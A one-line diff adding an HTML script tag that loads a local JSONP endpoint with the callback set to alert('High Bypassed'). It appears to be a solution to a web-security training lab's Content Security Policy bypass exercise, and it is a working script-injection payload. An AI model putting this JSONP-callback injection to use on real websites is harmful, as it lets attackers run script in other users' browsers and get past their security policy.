@@ -1,0 +1,1 @@
+<script src="source/jsonp.php?callback=alert('High Bypassed')"></script>
